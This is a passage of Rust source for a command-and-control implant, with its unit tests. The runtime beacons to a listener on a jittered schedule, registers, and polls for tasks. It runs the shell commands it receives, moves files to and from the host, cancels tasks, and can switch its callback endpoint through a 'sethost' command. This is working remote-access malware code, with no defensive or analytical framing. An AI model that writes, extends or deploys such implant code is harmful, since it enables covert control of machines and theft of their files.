                return;
            }
            active.phase = TransferPhase::Finalizing;
            let upload = active.transfer.take().unwrap();
            let task_id = active.task_id;
            let destination = upload.dest.clone();
            #[cfg(test)]
            let terminal_barriers = active.terminal_barriers.clone();
            #[cfg(not(test))]
            let terminal_barriers: Option<(
                Arc<std::sync::Barrier>,
                Arc<std::sync::Barrier>,
            )> = None;
            Some((
                upload,
                Arc::clone(&active.control),
                task_id,
                destination,
                terminal_barriers,
            ))
        }) else {
            return;
        };

        let validation = upload.validate();
        let result = {
            let mut decision = control.decision.lock().unwrap();
            match *decision {
                TransferDecision::Cancelled => {
                    drop(decision);
                    let _ = upload.cancel();
                    cancelled_result(task_id)
                }
                TransferDecision::Active => {
                    let result = match validation.and_then(|()| upload.publish()) {
                        Ok(()) => TaskResult {
                            task_id,
                            ok: true,
                            stdout: format!("uploaded {} bytes to {destination}", ack.received)
                                .into_bytes(),
                            stderr: Vec::new(),
                            exit_code: 0,
                        },
                        Err(error) => TaskResult {
                            task_id,
                            ok: false,
                            stdout: Vec::new(),
                            stderr: error.into_bytes(),
                            exit_code: -1,
                        },
                    };
                    *decision = TransferDecision::Terminal;
                    result
                }
                TransferDecision::Terminal => return,
            }
        };
        if let Some((reached, release)) = terminal_barriers {
            reached.wait();
            release.wait();
        }
        let mut slot = self.upload.write().unwrap();
        if slot.as_ref().is_some_and(|active| {
            active.task_id() == task_id && active.phase == TransferPhase::Finalizing
        }) {
            let mut active = slot.take().unwrap();
            self.task_states
                .lock()
                .unwrap()
                .insert(task_id, ActiveTask::Completing);
            if let Some(completion) = active.completion.take() {
                let _ = completion.send(result);
            }
        }
    }

    async fn finalize_download(&self, ack: FileAck) {
        let Some((download, control, task_id, size, terminal_barriers)) = ({
            let mut slot = self.download.write().unwrap();
            let Some(active) = slot.as_mut() else {
                return;
            };
            if active.phase != TransferPhase::Active
                || !active
                    .transfer
                    .as_ref()
                    .is_some_and(|download| ack.transfer_id == Some(download.transfer_id()))
            {
                return;
            }
            active.phase = TransferPhase::Finalizing;
            let download = active.transfer.take().unwrap();
            let task_id = active.task_id;
            let size = download.size;
            #[cfg(test)]
            let terminal_barriers = active.terminal_barriers.clone();
            #[cfg(not(test))]
            let terminal_barriers: Option<(
                Arc<std::sync::Barrier>,
                Arc<std::sync::Barrier>,
            )> = None;
            Some((
                download,
                Arc::clone(&active.control),
                task_id,
                size,
                terminal_barriers,
            ))
        }) else {
            return;
        };

        let validation = download.validate();
        let result = {
            let mut decision = control.decision.lock().unwrap();
            match *decision {
                TransferDecision::Cancelled => cancelled_result(task_id),
                TransferDecision::Active => {
                    let result = match validation {
                        Ok(()) => TaskResult {
                            task_id,
                            ok: true,
                            stdout: format!("downloaded {} bytes of {size}", ack.received)
                                .into_bytes(),
                            stderr: Vec::new(),
                            exit_code: 0,
                        },
                        Err(error) => TaskResult {
                            task_id,
                            ok: false,
                            stdout: Vec::new(),
                            stderr: error.into_bytes(),
                            exit_code: -1,
                        },
                    };
                    *decision = TransferDecision::Terminal;
                    result
                }
                TransferDecision::Terminal => return,
            }
        };
        if let Some((reached, release)) = terminal_barriers {
            reached.wait();
            release.wait();
        }
        let mut slot = self.download.write().unwrap();
        if slot.as_ref().is_some_and(|active| {
            active.task_id() == task_id && active.phase == TransferPhase::Finalizing
        }) {
            let mut active = slot.take().unwrap();
            self.task_states
                .lock()
                .unwrap()
                .insert(task_id, ActiveTask::Completing);
            if let Some(completion) = active.completion.take() {
                let _ = completion.send(result);
            }
        }
    }

    fn session_key(&self) -> [u8; crypto::KEY_LEN] {
        *self.key.read().unwrap()
    }

    fn sleep(&self) -> Duration {
        let j = self.profile.jitter.as_millis() as u64;
        let jitter_ms = if j == 0 { 0 } else { rand_jitter(j) };
        Duration::from_millis(self.profile.interval.as_millis() as u64 + jitter_ms)
    }

    /// Own the beacon loop until signalled to stop.
    pub async fn run(self: Arc<Self>) -> anyhow::Result<()> {
        loop {
            if self.should_stop() {
                tracing::info!("implant stop requested");
                break;
            }
            let current = *self.session_id.read().unwrap();
            let sid = match current {
                Some(id) => id,
                None => match self.register().await {
                    Ok(id) => {
                        *self.session_id.write().unwrap() = Some(id);
                        id
                    }
                    Err(e) => {
                        tracing::warn!("register failed: {}", e);
                        tokio::time::sleep(self.sleep()).await;
                        continue;
                    }
                },
            };

            match self.poll(sid).await {
                // Run the batch detached so long-running and short tasks
                // execute concurrently and polling never stalls behind a
                // `sleep`-style in-flight command (cancellation needs the
                // beacon loop to keep polling while a child runs).
                Ok(tasks) => {
                    let rt = Arc::clone(&self);
                    tokio::spawn(async move { rt.execute(tasks).await });
                }
                Err(e) => {
                    tracing::warn!("poll failed: {}", e);
                }
            }
            tokio::time::sleep(self.sleep()).await;
        }
        Ok(())
    }
}

fn encode_key(k: &[u8]) -> String {
    use base64::Engine;
    base64::engine::general_purpose::STANDARD.encode(k)
}

fn decode_key(s: &str) -> Result<[u8; 32], String> {
    use base64::Engine;
    let raw = base64::engine::general_purpose::STANDARD
        .decode(s)
        .map_err(|e| e.to_string())?;
    <[u8; 32]>::try_from(raw.as_slice()).map_err(|_| "server pub key must be 32 bytes".into())
}

fn rand_jitter(max: u64) -> u64 {
    use rand::Rng;
    rand::thread_rng().gen_range(0..max)
}

#[derive(Debug)]
struct AnyError(String);
impl std::fmt::Display for AnyError {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        write!(f, "{}", self.0)
    }
}
impl std::error::Error for AnyError {}

#[cfg(test)]
mod tests {
    use super::*;

    #[cfg(unix)]
    fn long_running_command() -> (String, Vec<String>) {
        ("sh".into(), vec!["-c".into(), "sleep 30".into()])
    }

    #[cfg(windows)]
    fn long_running_command() -> (String, Vec<String>) {
        (
            "cmd.exe".into(),
            vec![
                "/D".into(),
                "/S".into(),
                "/C".into(),
                "ping -n 31 127.0.0.1 > nul".into(),
            ],
        )
    }

    fn runtime() -> BeaconRuntime {
        BeaconRuntime::new(
            Profile {
                endpoint: "http://listener.example:8081".into(),
                interval: Duration::from_secs(1),
                jitter: Duration::ZERO,
                hostname: "test-host".into(),
                username: "test-user".into(),
                os: "test-os".into(),
                arch: "test-arch".into(),
                pid: 1,
                addr: "127.0.0.1".into(),
            },
            b"test-psk".to_vec(),
        )
    }

    #[test]
    fn jittered_sleep_stays_within_the_configured_window() {
        let mut runtime = runtime();
        runtime.profile.interval = Duration::from_millis(100);
        runtime.profile.jitter = Duration::from_millis(50);

        for _ in 0..32 {
            let delay = runtime.sleep();
            assert!(delay >= Duration::from_millis(100));
            assert!(delay < Duration::from_millis(150));
        }
    }

    #[test]
    fn sealed_wire_request_truncates_one_download_chunk_and_makes_progress() {
        let key = crypto::derive_key(b"request-budget", b"test");
        let session_id = Uuid::new_v4();
        let transfer_id = Uuid::new_v4();
        let task_id = Uuid::new_v4();
        let inner_budget = 1200;
        let request = PollRequest {
            file_chunks: vec![nw_profile::msgs::FileChunk {
                transfer_id: Some(transfer_id),
                task_id: Some(task_id),
                name: "artifact.bin".into(),
                offset: 17,
                total: 4096,
                data: vec![0x5a; 1024],
            }],
            inner_budget,
            ..Default::default()
        };

        let envelope =
            fit_poll_request_to_budget(&key, 77, session_id, inner_budget, request).unwrap();
        let sealed = envelope.seal(&key).unwrap();

        assert!(
            sealed.len() <= inner_budget,
            "sealed request was {} bytes",
            sealed.len()
        );
        let plaintext = crypto::decrypt(&key, envelope.id, &envelope.encrypted).unwrap();
        let fitted: PollRequest = serde_json::from_slice(&plaintext).unwrap();
        assert_eq!(fitted.file_chunks.len(), 1);
        assert_eq!(fitted.file_chunks[0].offset, 17);
        assert_eq!(fitted.file_chunks[0].total, 4096);
        assert!(!fitted.file_chunks[0].data.is_empty());
        assert!(fitted.file_chunks[0].data.len() < 1024);
    }

    #[test]
    fn sealed_wire_request_rejects_fixed_payload_that_cannot_fit() {
        let key = crypto::derive_key(b"request-fixed-budget", b"test");
        let task_id = Uuid::new_v4();
        let request = PollRequest {
            results: vec![TaskResult {
                task_id,
                ok: true,
                stdout: vec![0x41; 2048],
                stderr: Vec::new(),
                exit_code: 0,
            }],
            inner_budget: 1200,
            ..Default::default()
        };

        let error =
            fit_poll_request_to_budget(&key, 78, Uuid::new_v4(), 1200, request).unwrap_err();

        assert_eq!(
            error.0,
            "poll request fixed payload exceeds sealed wire budget"
        );
    }

    #[tokio::test]
    async fn completed_task_is_removed_from_cancellation_registry() {
        let runtime = Arc::new(runtime());
        let task = Task {
            id: Uuid::new_v4(),
            command: "printf".into(),
            args: vec!["done".into()],
            timeout_ms: 1_000,
        };
        Arc::clone(&runtime).execute(vec![task.clone()]).await;
        assert!(!runtime.kill_task(&task.id).await);
    }

    #[tokio::test]
    async fn accepted_batch_runs_independently_and_kill_suppresses_queued_work() {
        let runtime = Arc::new(runtime());
        let (command, args) = long_running_command();
        let victim = Task {
            id: Uuid::new_v4(),
            command,
            args,
            timeout_ms: 60_000,
        };
        let kill = Task {
            id: Uuid::new_v4(),
            command: "nw/killtask".into(),
            args: vec![victim.id.to_string()],
            timeout_ms: 10_000,
        };
        assert!(runtime.accept_task(victim.id));
        assert!(runtime.accept_task(kill.id));

        tokio::time::timeout(
            Duration::from_secs(2),
            Arc::clone(&runtime).execute(vec![victim.clone(), kill.clone()]),
        )
        .await
        .expect("kill task must not wait behind the long-running victim");

        let results = runtime.pending.lock().unwrap();
        let victim_result = results
            .iter()
            .find(|result| result.task_id == victim.id)
            .expect("victim cancellation result");
        let kill_result = results
            .iter()
            .find(|result| result.task_id == kill.id)
            .expect("kill control result");
        assert!(!victim_result.ok);
        assert_eq!(victim_result.stderr, b"task cancelled");
        assert!(kill_result.ok);
    }

    #[tokio::test]
    async fn killtask_cancels_an_accepted_task_before_it_is_scheduled() {
        let runtime = Arc::new(runtime());
        let (command, args) = long_running_command();
        let victim = Task {
            id: Uuid::new_v4(),
            command,
            args,
            timeout_ms: 60_000,
        };
        let kill = Task {
            id: Uuid::new_v4(),
            command: "nw/killtask".into(),
            args: vec![victim.id.to_string()],
            timeout_ms: 10_000,
        };
        assert!(runtime.accept_task(victim.id));
        assert!(runtime.accept_task(kill.id));

        Arc::clone(&runtime).execute(vec![kill.clone()]).await;
        tokio::time::timeout(
            Duration::from_secs(1),
            Arc::clone(&runtime).execute(vec![victim.clone()]),
        )
        .await
        .expect("cancelled accepted task must never start");

        let results = runtime.pending.lock().unwrap();
        assert!(
            results
                .iter()
                .any(|result| result.task_id == kill.id && result.ok)
        );
        assert!(results.iter().any(|result| {
            result.task_id == victim.id && !result.ok && result.stderr == b"task cancelled"
        }));
    }

    #[tokio::test]
    async fn killtask_cancels_a_real_upload_slot_and_emits_terminal_result() {
        let runtime = Arc::new(runtime());
        let destination = std::env::temp_dir().join(format!(
            "nw-runtime-cancel-{}-{}.bin",
            std::process::id(),
            Uuid::new_v4()
        ));
        let task = Task {
            id: Uuid::new_v4(),
            command: "nw/upload".into(),
            args: vec![
                destination.to_string_lossy().into_owned(),
                Uuid::new_v4().to_string(),
                "3072".into(),
            ],
            timeout_ms: 60_000,
        };
        assert!(runtime.accept_task(task.id));
        let runner = tokio::spawn(Arc::clone(&runtime).execute(vec![task.clone()]));
        tokio::time::timeout(Duration::from_secs(2), async {
            loop {
                if runtime.upload.read().unwrap().is_some() {
                    break;
                }
                tokio::time::sleep(Duration::from_millis(5)).await;
            }
        })
        .await
        .expect("upload slot must remain registered while transfer is active");
        assert!(runtime.kill_task(&task.id).await);
        tokio::time::timeout(Duration::from_secs(2), runner)
            .await
            .expect("cancelled transfer task must terminate")
            .expect("transfer executor join");
        let results = runtime.pending.lock().unwrap();
        let result = results
            .iter()
            .find(|result| result.task_id == task.id)
            .expect("cancelled transfer result");
        assert!(!result.ok);
        assert_eq!(result.stderr, b"task cancelled");
        let _ = std::fs::remove_file(&destination);
        let _ = std::fs::remove_file(format!("{}.nwpart-{}", destination.display(), task.args[1]));
    }

    #[tokio::test(flavor = "multi_thread", worker_threads = 2)]
    async fn kill_during_upload_finalize_yields_one_cancelled_result() {
        use sha2::{Digest, Sha256};

        let runtime = Arc::new(runtime());
        let directory = tempfile::tempdir().unwrap();
        let destination = directory.path().join("published.bin");
        let transfer_id = Uuid::new_v4();
        let task = Task {
            id: Uuid::new_v4(),
            command: "nw/upload".into(),
            args: vec![
                destination.to_string_lossy().into_owned(),
                transfer_id.to_string(),
                "3".into(),
                hex::encode(Sha256::digest(b"new")),
            ],
            timeout_ms: 60_000,
        };
        assert!(runtime.accept_task(task.id));
        let runner = tokio::spawn(Arc::clone(&runtime).execute(vec![task.clone()]));
        tokio::time::timeout(Duration::from_secs(2), async {
            while runtime.upload.read().unwrap().is_none() {
                tokio::task::yield_now().await;
            }
        })
        .await
        .expect("upload slot installation");

        let reached = Arc::new(std::sync::Barrier::new(2));
        let release = Arc::new(std::sync::Barrier::new(2));
        {
            let mut slot = runtime.upload.write().unwrap();
            let upload = slot
                .as_mut()
                .and_then(|active| active.transfer.as_mut())
                .expect("active upload transfer");
            upload
                .write_chunk(&nw_profile::msgs::FileChunk {
                    transfer_id: Some(transfer_id),
                    task_id: Some(task.id),
                    name: destination.to_string_lossy().into_owned(),
                    offset: 0,
                    total: 3,
                    data: b"new".to_vec(),
                })
                .unwrap();
            upload.set_finalize_barriers(Arc::clone(&reached), Arc::clone(&release));
        }
        let finalizer = {
            let runtime = Arc::clone(&runtime);
            tokio::spawn(async move {
                runtime
                    .finalize_upload(FileAck {
                        transfer_id: Some(transfer_id),
                        received: 3,
                        total: 3,
                        done: true,
                    })
                    .await;
            })
        };
        tokio::task::spawn_blocking(move || reached.wait())
            .await
            .unwrap();

        let kill = Task {
            id: Uuid::new_v4(),
            command: "nw/killtask".into(),
            args: vec![task.id.to_string()],
            timeout_ms: 10_000,
        };
        assert!(runtime.accept_task(kill.id));
        Arc::clone(&runtime).execute(vec![kill.clone()]).await;
        tokio::task::spawn_blocking(move || release.wait())
            .await
            .unwrap();
        finalizer.await.unwrap();
        runner.await.unwrap();

        assert!(!destination.exists());
        assert!(
            !directory
                .path()
                .join(format!("published.bin.nwpart-{transfer_id}"))
                .exists()
        );
        let results = runtime.pending.lock().unwrap();
        let terminal = results
            .iter()
            .filter(|result| result.task_id == task.id)
            .collect::<Vec<_>>();
        assert_eq!(terminal.len(), 1);
        assert!(!terminal[0].ok);
        assert_eq!(terminal[0].stderr, b"task cancelled");
        assert!(
            !results
                .iter()
                .any(|result| result.task_id == task.id && result.ok)
        );
        drop(results);

        let next = Task {
            id: Uuid::new_v4(),
            command: "nw/upload".into(),
            args: vec![
                directory
                    .path()
                    .join("next.bin")
                    .to_string_lossy()
                    .into_owned(),
                Uuid::new_v4().to_string(),
                "1".into(),
            ],
            timeout_ms: 60_000,
        };
        assert!(runtime.accept_task(next.id));
        let next_runner = tokio::spawn(Arc::clone(&runtime).execute(vec![next.clone()]));
        tokio::time::timeout(Duration::from_secs(2), async {
            loop {
                if runtime
                    .upload
                    .read()
                    .unwrap()
                    .as_ref()
                    .is_some_and(|active| active.task_id() == next.id)
                {
                    break;
                }
                tokio::task::yield_now().await;
            }
        })
        .await
        .expect("next upload FIFO slot");
        assert!(runtime.kill_task(&next.id).await);
        next_runner.await.unwrap();
    }

    #[tokio::test(flavor = "multi_thread", worker_threads = 2)]
    async fn kill_during_download_finalize_yields_one_cancelled_result() {
        let runtime = Arc::new(runtime());
        let directory = tempfile::tempdir().unwrap();
        let source = directory.path().join("source.bin");
        std::fs::write(&source, b"new").unwrap();
        let transfer_id = Uuid::new_v4();
        let task = Task {
            id: Uuid::new_v4(),
            command: "nw/download".into(),
            args: vec![
                source.to_string_lossy().into_owned(),
                transfer_id.to_string(),
            ],
            timeout_ms: 60_000,
        };
        assert!(runtime.accept_task(task.id));
        let runner = tokio::spawn(Arc::clone(&runtime).execute(vec![task.clone()]));
        tokio::time::timeout(Duration::from_secs(2), async {
            while runtime.download.read().unwrap().is_none() {
                tokio::task::yield_now().await;
            }
        })
        .await
        .expect("download slot installation");

        let reached = Arc::new(std::sync::Barrier::new(2));
        let release = Arc::new(std::sync::Barrier::new(2));
        runtime
            .download
            .write()
            .unwrap()
            .as_mut()
            .and_then(|active| active.transfer.as_mut())
            .unwrap()
            .set_finalize_barriers(Arc::clone(&reached), Arc::clone(&release));
        let finalizer = {
            let runtime = Arc::clone(&runtime);
            tokio::spawn(async move {
                runtime
                    .finalize_download(FileAck {
                        transfer_id: Some(transfer_id),
                        received: 3,
                        total: 3,
                        done: true,
                    })
                    .await;
            })
        };
        tokio::task::spawn_blocking(move || reached.wait())
            .await
            .unwrap();

        let kill = Task {
            id: Uuid::new_v4(),
            command: "nw/killtask".into(),
            args: vec![task.id.to_string()],
            timeout_ms: 10_000,
        };
        assert!(runtime.accept_task(kill.id));
        Arc::clone(&runtime).execute(vec![kill]).await;
        tokio::task::spawn_blocking(move || release.wait())
            .await
            .unwrap();
        finalizer.await.unwrap();
        runner.await.unwrap();

        let results = runtime.pending.lock().unwrap();
        let terminal = results
            .iter()
            .filter(|result| result.task_id == task.id)
            .collect::<Vec<_>>();
        assert_eq!(terminal.len(), 1);
        assert!(!terminal[0].ok);
        assert_eq!(terminal[0].stderr, b"task cancelled");
        assert!(
            !results
                .iter()
                .any(|result| result.task_id == task.id && result.ok)
        );
        drop(results);

        let next = Task {
            id: Uuid::new_v4(),
            command: "nw/download".into(),
            args: vec![
                source.to_string_lossy().into_owned(),
                Uuid::new_v4().to_string(),
            ],
            timeout_ms: 60_000,
        };
        assert!(runtime.accept_task(next.id));
        let next_runner = tokio::spawn(Arc::clone(&runtime).execute(vec![next.clone()]));
        tokio::time::timeout(Duration::from_secs(2), async {
            loop {
                if runtime
                    .download
                    .read()
                    .unwrap()
                    .as_ref()
                    .is_some_and(|active| active.task_id() == next.id)
                {
                    break;
                }
                tokio::task::yield_now().await;
            }
        })
        .await
        .expect("next download FIFO slot");
        assert!(runtime.kill_task(&next.id).await);
        next_runner.await.unwrap();
    }

    #[tokio::test(flavor = "multi_thread", worker_threads = 2)]
    async fn kill_after_upload_success_decision_returns_false_and_keeps_success() {
        let runtime = Arc::new(runtime());
        let directory = tempfile::tempdir().unwrap();
        let destination = directory.path().join("decided-upload.bin");
        let transfer_id = Uuid::new_v4();
        let task = Task {
            id: Uuid::new_v4(),
            command: "nw/upload".into(),
            args: vec![
                destination.to_string_lossy().into_owned(),
                transfer_id.to_string(),
                "3".into(),
            ],
            timeout_ms: 60_000,
        };
        assert!(runtime.accept_task(task.id));
        let runner = tokio::spawn(Arc::clone(&runtime).execute(vec![task.clone()]));
        tokio::time::timeout(Duration::from_secs(2), async {
            while runtime.upload.read().unwrap().is_none() {
                tokio::task::yield_now().await;
            }
        })
        .await
        .unwrap();
        let reached = Arc::new(std::sync::Barrier::new(2));
        let release = Arc::new(std::sync::Barrier::new(2));
        {
            let mut slot = runtime.upload.write().unwrap();
            let active = slot.as_mut().unwrap();
            active
                .transfer
                .as_mut()
                .unwrap()
                .write_chunk(&nw_profile::msgs::FileChunk {
                    transfer_id: Some(transfer_id),
                    task_id: Some(task.id),
                    name: destination.to_string_lossy().into_owned(),
                    offset: 0,
                    total: 3,
                    data: b"new".to_vec(),
                })
                .unwrap();
            active.set_terminal_barriers(Arc::clone(&reached), Arc::clone(&release));
        }
        let finalizer = {
            let runtime = Arc::clone(&runtime);
            tokio::spawn(async move {
                runtime
                    .finalize_upload(FileAck {
                        transfer_id: Some(transfer_id),
                        received: 3,
                        total: 3,
                        done: true,
                    })
                    .await;
            })
        };
        tokio::task::spawn_blocking(move || reached.wait())
            .await
            .unwrap();

        assert!(!runtime.kill_task(&task.id).await);
        tokio::task::spawn_blocking(move || release.wait())
            .await
            .unwrap();
        finalizer.await.unwrap();
        runner.await.unwrap();

        assert_eq!(std::fs::read(destination).unwrap(), b"new");
        let results = runtime.pending.lock().unwrap();
        let terminal = results
            .iter()
            .filter(|result| result.task_id == task.id)
            .collect::<Vec<_>>();
        assert_eq!(terminal.len(), 1);
        assert!(terminal[0].ok);
    }

    #[tokio::test(flavor = "multi_thread", worker_threads = 2)]
    async fn kill_after_download_success_decision_returns_false_and_keeps_success() {
        let runtime = Arc::new(runtime());
        let directory = tempfile::tempdir().unwrap();
        let source = directory.path().join("decided-download.bin");
        std::fs::write(&source, b"new").unwrap();
        let transfer_id = Uuid::new_v4();
        let task = Task {
            id: Uuid::new_v4(),
            command: "nw/download".into(),
            args: vec![
                source.to_string_lossy().into_owned(),
                transfer_id.to_string(),
            ],
            timeout_ms: 60_000,
        };
        assert!(runtime.accept_task(task.id));
        let runner = tokio::spawn(Arc::clone(&runtime).execute(vec![task.clone()]));
        tokio::time::timeout(Duration::from_secs(2), async {
            while runtime.download.read().unwrap().is_none() {
                tokio::task::yield_now().await;
            }
        })
        .await
        .unwrap();
        let reached = Arc::new(std::sync::Barrier::new(2));
        let release = Arc::new(std::sync::Barrier::new(2));
        runtime
            .download
            .write()
            .unwrap()
            .as_mut()
            .unwrap()
            .set_terminal_barriers(Arc::clone(&reached), Arc::clone(&release));
        let finalizer = {
            let runtime = Arc::clone(&runtime);
            tokio::spawn(async move {
                runtime
                    .finalize_download(FileAck {
                        transfer_id: Some(transfer_id),
                        received: 3,
                        total: 3,
                        done: true,
                    })
                    .await;
            })
        };
        tokio::task::spawn_blocking(move || reached.wait())
            .await
            .unwrap();

        assert!(!runtime.kill_task(&task.id).await);
        tokio::task::spawn_blocking(move || release.wait())
            .await
            .unwrap();
        finalizer.await.unwrap();
        runner.await.unwrap();

        let results = runtime.pending.lock().unwrap();
        let terminal = results
            .iter()
            .filter(|result| result.task_id == task.id)
            .collect::<Vec<_>>();
        assert_eq!(terminal.len(), 1);
        assert!(terminal[0].ok);
    }

    #[tokio::test(flavor = "multi_thread", worker_threads = 2)]
    async fn cancellation_before_upload_slot_installation_leaves_no_orphan() {
        let runtime = Arc::new(runtime());
        let directory = tempfile::tempdir().unwrap();
        let destination = directory.path().join("never-installed.bin");
        let transfer_id = Uuid::new_v4();
        let task = Task {
            id: Uuid::new_v4(),
            command: "nw/upload".into(),
            args: vec![
                destination.to_string_lossy().into_owned(),
                transfer_id.to_string(),
                "3".into(),
            ],
            timeout_ms: 60_000,
        };
        let (reached, mut reached_rx) = tokio::sync::mpsc::unbounded_channel();
        let release = Arc::new(tokio::sync::Notify::new());
        runtime.set_upload_install_barrier(reached, Arc::clone(&release));
        assert!(runtime.accept_task(task.id));
        let runner = tokio::spawn(Arc::clone(&runtime).execute(vec![task.clone()]));
        tokio::time::timeout(Duration::from_secs(2), reached_rx.recv())
            .await
            .unwrap()
            .unwrap();

        assert!(runtime.kill_task(&task.id).await);
        release.notify_one();
        runner.await.unwrap();

        assert!(runtime.upload.read().unwrap().is_none());
        assert!(!destination.exists());
        assert!(
            !directory
                .path()
                .join(format!("never-installed.bin.nwpart-{transfer_id}"))
                .exists()
        );
        let results = runtime.pending.lock().unwrap();
        assert_eq!(
            results
                .iter()
                .filter(|result| result.task_id == task.id)
                .count(),
            1
        );
        assert!(
            results
                .iter()
                .any(|result| result.task_id == task.id && !result.ok)
        );
        drop(results);

        let next = Task {
            id: Uuid::new_v4(),
            command: "nw/upload".into(),
            args: vec![
                directory
                    .path()
                    .join("next.bin")
                    .to_string_lossy()
                    .into_owned(),
                Uuid::new_v4().to_string(),
                "1".into(),
            ],
            timeout_ms: 60_000,
        };
        assert!(runtime.accept_task(next.id));
        let next_runner = tokio::spawn(Arc::clone(&runtime).execute(vec![next.clone()]));
        tokio::time::timeout(Duration::from_secs(2), async {
            while !runtime
                .upload
                .read()
                .unwrap()
                .as_ref()
                .is_some_and(|active| active.task_id() == next.id)
            {
                tokio::task::yield_now().await;
            }
        })
        .await
        .unwrap();
        assert!(runtime.kill_task(&next.id).await);
        next_runner.await.unwrap();
    }

    #[tokio::test(flavor = "multi_thread", worker_threads = 2)]
    async fn accepted_cancellation_beats_upload_checksum_failure_and_cleans_sidecar() {
        let runtime = Arc::new(runtime());
        let directory = tempfile::tempdir().unwrap();
        let destination = directory.path().join("checksum-cancel.bin");
        let transfer_id = Uuid::new_v4();
        let task = Task {
            id: Uuid::new_v4(),
            command: "nw/upload".into(),
            args: vec![
                destination.to_string_lossy().into_owned(),
                transfer_id.to_string(),
                "3".into(),
                "00".repeat(32),
            ],
            timeout_ms: 60_000,
        };
        assert!(runtime.accept_task(task.id));
        let runner = tokio::spawn(Arc::clone(&runtime).execute(vec![task.clone()]));
        tokio::time::timeout(Duration::from_secs(2), async {
            while runtime.upload.read().unwrap().is_none() {
                tokio::task::yield_now().await;
            }
        })
        .await
        .unwrap();
        let (reached_tx, reached_rx) = std::sync::mpsc::channel();
        let (release_tx, release_rx) = std::sync::mpsc::channel();
        {
            let mut slot = runtime.upload.write().unwrap();
            let upload = slot
                .as_mut()
                .and_then(|active| active.transfer.as_mut())
                .unwrap();
            upload
                .write_chunk(&nw_profile::msgs::FileChunk {
                    transfer_id: Some(transfer_id),
                    task_id: Some(task.id),
                    name: destination.to_string_lossy().into_owned(),
                    offset: 0,
                    total: 3,
                    data: b"new".to_vec(),
                })
                .unwrap();
            upload.set_validation_channels(reached_tx, release_rx);
        }
        let finalizer = {
            let runtime = Arc::clone(&runtime);
            tokio::spawn(async move {
                runtime
                    .finalize_upload(FileAck {
                        transfer_id: Some(transfer_id),
                        received: 3,
                        total: 3,
                        done: true,
                    })
                    .await;
            })
        };
        tokio::task::spawn_blocking(move || reached_rx.recv_timeout(Duration::from_secs(2)))
            .await
            .unwrap()
            .expect("hash validation boundary");

        assert!(runtime.kill_task(&task.id).await);
        release_tx.send(()).unwrap();
        finalizer.await.unwrap();
        runner.await.unwrap();

        assert!(!destination.exists());
        assert!(
            !directory
                .path()
                .join(format!("checksum-cancel.bin.nwpart-{transfer_id}"))
                .exists()
        );
        let results = runtime.pending.lock().unwrap();
        let terminal = results
            .iter()
            .filter(|result| result.task_id == task.id)
            .collect::<Vec<_>>();
        assert_eq!(terminal.len(), 1);
        assert_eq!(terminal[0].stderr, b"task cancelled");
    }

    #[test]
    fn task_id_tracking_is_bounded() {
        let runtime = runtime();
        let mut accepted = Vec::new();
        for _ in 0..TASK_ID_MEMORY_LIMIT {
            let id = Uuid::new_v4();
            assert!(runtime.accept_task(id));
            accepted.push(id);
        }
        assert!(!runtime.accept_task(Uuid::new_v4()));
        assert_eq!(
            runtime.task_states.lock().unwrap().len(),
            TASK_ID_MEMORY_LIMIT
        );

        let oldest = Uuid::new_v4();
        runtime.completed.lock().unwrap().insert(oldest);
        let mut newest = oldest;
        for _ in 0..TASK_ID_MEMORY_LIMIT {
            newest = Uuid::new_v4();
            runtime.completed.lock().unwrap().insert(newest);
        }
        let completed = runtime.completed.lock().unwrap();
        assert_eq!(completed.ids.len(), TASK_ID_MEMORY_LIMIT);
        assert!(!completed.contains(&oldest));
        assert!(completed.contains(&newest));
        drop(completed);
        assert_eq!(
            runtime.accepted_task_ids.lock().unwrap().len(),
            TASK_ID_MEMORY_LIMIT
        );
        assert_eq!(accepted.len(), TASK_ID_MEMORY_LIMIT);
    }

    #[tokio::test]
    async fn sethost_rejects_relative_endpoint_without_mutating_runtime() {
        let runtime = Arc::new(runtime());
        let task = Task {
            id: Uuid::new_v4(),
            command: "nw/sethost".into(),
            args: vec!["/relative-listener".into()],
            timeout_ms: 0,
        };

        assert!(runtime.accept_task(task.id));
        Arc::clone(&runtime).execute(vec![task.clone()]).await;

        assert_eq!(
            runtime.transport.read().unwrap().describe(),
            "http://listener.example:8081"
        );
        let result = runtime.pending.lock().unwrap().pop().unwrap();
        assert_eq!(result.task_id, task.id);
        assert!(!result.ok);
        assert_eq!(result.exit_code, -1);
        assert!(!result.stderr.is_empty());
    }

    #[tokio::test]
    async fn sethost_rejects_non_http_scheme_without_mutating_runtime() {
        let runtime = Arc::new(runtime());
        let task = Task {
            id: Uuid::new_v4(),
            command: "nw/sethost".into(),
            args: vec!["ftp://listener.example:8081".into()],
            timeout_ms: 0,
        };

        assert!(runtime.accept_task(task.id));
        Arc::clone(&runtime).execute(vec![task.clone()]).await;

        assert_eq!(
            runtime.transport.read().unwrap().describe(),
            "http://listener.example:8081"
        );
        let result = runtime.pending.lock().unwrap().pop().unwrap();
        assert_eq!(result.task_id, task.id);
        assert!(!result.ok);
        assert_eq!(result.exit_code, -1);
        assert!(!result.stderr.is_empty());
    }

    #[tokio::test]
    async fn sethost_switches_transport_cleanly() {
        let runtime = Arc::new(runtime());
        let task = Task {
            id: Uuid::new_v4(),
            command: "nw/sethost".into(),
            args: vec!["tcp://10.9.9.9:9999".into()],
            timeout_ms: 0,
        };

        assert!(runtime.accept_task(task.id));
        Arc::clone(&runtime).execute(vec![task.clone()]).await;

        assert_eq!(
            runtime.transport.read().unwrap().describe(),
            "tcp://10.9.9.9:9999"
        );
        let result = runtime.pending.lock().unwrap().pop().unwrap();
        assert!(result.ok);
        assert_eq!(result.exit_code, 0);
    }
}
